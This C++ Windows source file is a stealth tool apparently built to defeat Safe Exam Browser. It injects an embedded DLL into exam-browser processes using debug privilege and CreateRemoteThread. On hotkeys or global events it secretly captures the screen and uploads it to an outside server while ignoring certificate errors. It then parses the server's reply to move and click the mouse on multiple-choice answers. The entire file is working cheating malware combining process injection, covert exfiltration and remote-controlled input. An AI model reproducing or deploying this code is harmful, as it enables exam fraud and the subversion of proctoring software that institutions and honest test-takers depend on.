#define STB_IMAGE_WRITE_IMPLEMENTATION
#include "src/stb_image_write.h"
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <set>
#include <algorithm>
#include <thread>
#include <chrono>
#include <fstream>

// EMBEDDED DLL BYTES 
#include "wda_bytes.h"

#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Wininet.lib")

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")

// --- CONFIG ---
const char* CLOUD_URL = "https://exam-system-v1.onrender.com/upload";
const char* SECRET_KEY = "super-secret-key"; 

// --- GLOBALS ---
std::set<DWORD> injectedPIDs;
bool g_SEB_Detected = false;
std::string g_TempDllPath = "";

std::string ToLower(const std::string& str) {
    std::string lowerStr = str;
    std::transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower);
    return lowerStr;
}

std::string GetStandaloneDLLPath() {
    if (!g_TempDllPath.empty()) return g_TempDllPath;
    char tempDir[MAX_PATH];
    GetTempPathA(MAX_PATH, tempDir);
    std::string path = std::string(tempDir) + "seb_wda_temp.dll";
    std::ofstream out(path, std::ios::binary);
    if (out) {
        out.write((char*)wda_dll_bytes, wda_dll_len);
        out.close();
        g_TempDllPath = path;
    }
    return path;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkp;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) { CloseHandle(hToken); return false; }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = luid;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    bool res = AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
    CloseHandle(hToken);
    return res;
}

bool InjectDLL(DWORD pid) {
    std::string fullDllPath = GetStandaloneDLLPath();
    if (fullDllPath.empty()) return false;
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return false;
    LPVOID allocMem = VirtualAllocEx(hProcess, NULL, fullDllPath.length() + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!allocMem) { CloseHandle(hProcess); return false; }
    WriteProcessMemory(hProcess, allocMem, fullDllPath.c_str(), fullDllPath.length() + 1, NULL);
    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, allocMem, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return true;
    }
    CloseHandle(hProcess);
    return false;
}

void CheckAndInject() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe32; pe32.dwSize = sizeof(PROCESSENTRY32);
    bool found = false;
    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::string procName = ToLower(pe32.szExeFile);
            if ((procName.find("seb") != std::string::npos || procName.find("safeexam") != std::string::npos) &&
                procName.find("service") == std::string::npos &&
                procName.find("ghost") == std::string::npos) {
                found = true;
                if (injectedPIDs.find(pe32.th32ProcessID) == injectedPIDs.end()) {
                    if (InjectDLL(pe32.th32ProcessID)) {
                        injectedPIDs.insert(pe32.th32ProcessID);
                    }
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    g_SEB_Detected = found;
    CloseHandle(hSnapshot);
}

void DrawNumber(int n) {
    if (n < 1 || n > 4) return;
    HDESK hInput = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
    HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
    if (hInput) SetThreadDesktop(hInput);
    int cx = 32767, cy = 32767;
    int size = 5000;
    std::vector<POINT> points;
    if (n == 1) { points = { {cx, cy - size}, {cx, cy + size} }; }
    else if (n == 2) { points = { {cx - size, cy - size}, {cx + size, cy - size}, {cx + size, cy}, {cx - size, cy}, {cx - size, cy + size}, {cx + size, cy + size} }; }
    else if (n == 3) { points = { {cx - size, cy - size}, {cx + size, cy - size}, {cx + size, cy}, {cx - size, cy}, {cx + size, cy}, {cx + size, cy + size}, {cx - size, cy + size} }; }
    else if (n == 4) { points = { {cx - size, cy - size}, {cx - size, cy}, {cx + size, cy}, {cx + size, cy - size}, {cx + size, cy + size} }; }
    for (auto& p : points) {
        INPUT in = { 0 }; in.type = INPUT_MOUSE; in.mi.dx = p.x; in.mi.dy = p.y;
        in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
        SendInput(1, &in, sizeof(INPUT)); Sleep(200);
    }
    if (hInput) { SetThreadDesktop(hOriginal); CloseDesktop(hInput); }
}

void ExecuteAgentAction(std::string responseStr) {
    std::ofstream diagFile("C:\\seb_ghost_final.log", std::ios::app);
    if (diagFile.is_open()) diagFile << "[EXEC] " << responseStr << std::endl;
    size_t actKey = responseStr.find("\"action\"");
    size_t clickVal = responseStr.find("\"click\"");
    size_t xKey = responseStr.find("\"x_pct\"");
    size_t yKey = responseStr.find("\"y_pct\"");
    if (actKey != std::string::npos && clickVal != std::string::npos && xKey != std::string::npos && yKey != std::string::npos) {
        Beep(1500, 50); Beep(1800, 50); // Parsing success beeps
        auto GetFloat = [&](size_t pos) {
            size_t start = responseStr.find_first_of("0123456789.", pos + 7);
            if (start == std::string::npos) return 0.0;
            try { return std::stod(responseStr.substr(start)); } catch (...) { return 0.0; }
        };
        double x_pct = GetFloat(xKey); double y_pct = GetFloat(yKey);
        HDESK hInput = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
        HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
        if (hInput) SetThreadDesktop(hInput);
        int sw = GetSystemMetrics(SM_CXSCREEN) ? GetSystemMetrics(SM_CXSCREEN) : 1920;
        int sh = GetSystemMetrics(SM_CYSCREEN) ? GetSystemMetrics(SM_CYSCREEN) : 1080;
        int tx = (int)((x_pct / 100.0) * sw); int ty = (int)((y_pct / 100.0) * sh);
        if (diagFile.is_open()) diagFile << "[PARSED] Target: " << tx << "," << ty << std::endl;
        double dx = tx * (65535.0f / sw); double dy = ty * (65535.0f / sh);
        INPUT inputs[3] = {};
        inputs[0].type = INPUT_MOUSE; inputs[0].mi.dx = (LONG)dx; inputs[0].mi.dy = (LONG)dy; inputs[0].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
        inputs[1] = inputs[0]; inputs[1].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN;
        inputs[2] = inputs[0]; inputs[2].mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP;
        SendInput(3, inputs, sizeof(INPUT));
        if (hInput) { SetThreadDesktop(hOriginal); CloseDesktop(hInput); }
    } else {
        Beep(200, 500); // Low beep for parsing failure
        size_t optKey = responseStr.find("\"option_index\"");
        if (optKey != std::string::npos) {
            int option = std::stoi(responseStr.substr(responseStr.find_first_of("0123456789", optKey + 13)));
            if (option > 0) DrawNumber(option);
        }
    }
    if (diagFile.is_open()) diagFile.close();
}

void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
    HINTERNET hSession = InternetOpenA("SEB-Stealth", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return;
    HINTERNET hConnect = InternetConnectA(hSession, "exam-system-v1.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { InternetCloseHandle(hSession); return; }
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, 
        INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }
    
    std::string boundary = "----BoundaryGhostMode";
    std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";
    headers += "X-Secret: " + std::string(SECRET_KEY) + "\r\n";
    headers += "X-User-Id: " + std::to_string(user_id) + "\r\n";
    
    std::string bodyStart = "--" + boundary + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ghost_capture.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n";
    std::string bodyEnd = "\r\n--" + boundary + "--\r\n";
    std::vector<uint8_t> fullBody;
    fullBody.insert(fullBody.end(), bodyStart.begin(), bodyStart.end());
    fullBody.insert(fullBody.end(), jpegData.begin(), jpegData.end());
    fullBody.insert(fullBody.end(), bodyEnd.begin(), bodyEnd.end());

    if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)fullBody.data(), (DWORD)fullBody.size())) {
        // Success - server will queue the answer for ESP32
        Beep(1000, 100); 
    } else {
        DWORD err = GetLastError();
        // If it's a certificate error, try to ignore it
        if (err == ERROR_INTERNET_INVALID_CA || err == 12045) {
            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
            InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
            if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)fullBody.data(), (DWORD)fullBody.size())) {
                Beep(1000, 100); 
                InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
                return;
            }
        }
        Beep(200, 800); // Long low beep for upload error
    }
    InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
}

void CaptureThreadFunc(int user_id) {
    Beep(1500, 50); // Beep: Capture Triggered
    HDESK hInput = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
    HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
    if (hInput) SetThreadDesktop(hInput);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN); int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN); int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HDC hdc = GetDC(NULL);
    if (hdc) {
        HDC memdc = CreateCompatibleDC(hdc); HBITMAP hbmp = CreateCompatibleBitmap(hdc, w, h);
        HBITMAP oldbmp = (HBITMAP)SelectObject(memdc, hbmp);
        if (BitBlt(memdc, 0, 0, w, h, hdc, x, y, SRCCOPY | CAPTUREBLT)) {
            BITMAPINFOHEADER bi = { sizeof(bi), w, -h, 1, 32, BI_RGB };
            std::vector<uint8_t> pixels(w * h * 4);
            GetDIBits(hdc, hbmp, 0, h, pixels.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            auto write_func = [](void* context, void* data, int size) {
                auto vec = (std::vector<uint8_t>*)context;
                vec->insert(vec->end(), (uint8_t*)data, (uint8_t*)data + size);
            };
            std::vector<uint8_t> jpegBuffer;
            stbi_write_jpg_to_func(write_func, &jpegBuffer, w, h, 4, pixels.data(), 80);
            if (!jpegBuffer.empty()) {
                Beep(1800, 50); // Beep: Capture Success, Starting Upload
                UploadToCloud(jpegBuffer, user_id);
            }
        }
        SelectObject(memdc, oldbmp); DeleteObject(hbmp); DeleteDC(memdc); ReleaseDC(NULL, hdc);
    }
    if (hInput) { SetThreadDesktop(hOriginal); CloseDesktop(hInput); }
}

void DoStealthCapture(int user_id) { std::thread t(CaptureThreadFunc, user_id); t.detach(); }

int main() {
    SetProcessDPIAware(); EnableDebugPrivilege();
    SECURITY_DESCRIPTOR sd; InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = &sd;
    
    HANDLE hEvents[15];
    for (int i = 0; i < 15; i++) {
        std::string eventName = "Global\\SEB_Capture_Trigger_" + std::to_string(i + 1);
        hEvents[i] = CreateEventA(&sa, FALSE, FALSE, eventName.c_str());
    }
    
    while (true) {
        CheckAndInject();
        
        if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
            // Ctrl+Shift+X = quick capture for User 1 (backward compat)
            if (GetAsyncKeyState('X') & 0x8000) {
                DoStealthCapture(1);
                while (GetAsyncKeyState('X') & 0x8000) Sleep(100);
            }
            // Ctrl+Shift+A..O = multi-user capture (A=1, B=2, ..., O=15)
            for (int i = 0; i < 15; i++) {
                char key = 'A' + i;
                if (GetAsyncKeyState(key) & 0x8000) {
                    DoStealthCapture(i + 1); // User IDs 1 to 15
                    while (GetAsyncKeyState(key) & 0x8000) Sleep(100);
                }
            }
        }
        
        for (int i = 0; i < 15; i++) {
            if (hEvents[i] && WaitForSingleObject(hEvents[i], 0) == WAIT_OBJECT_0) {
                DoStealthCapture(i + 1); // User IDs 1 to 15
            }
        }
        Sleep(100);
    }
    return 0;
}
